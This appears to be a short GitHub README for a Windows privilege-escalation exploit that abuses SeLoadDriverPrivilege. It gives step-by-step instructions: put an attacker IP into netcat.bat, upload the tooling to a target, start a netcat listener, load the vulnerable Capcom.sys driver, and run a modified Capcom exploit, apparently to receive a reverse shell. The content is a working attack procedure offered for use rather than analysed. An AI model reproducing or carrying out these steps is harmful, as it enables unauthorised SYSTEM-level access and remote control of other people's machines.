# SeLoadDriverPrivilege

1. Edit netcat.bat to add your IP
2. Upload all the files on the Target Machine
3. Start netcat listener
```csharp
rlwrap -cAr nc -lvnp 2222
```
4. Run below commands 
```csharp
.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys
```

```csharp
.\ExploitCapcom_modded.exe
```
![image](https://github.com/Grizzy529/SeLoadDriverPrivilege/assets/102862377/4021b484-3ab6-4b3a-bf83-56b70ba9e671)
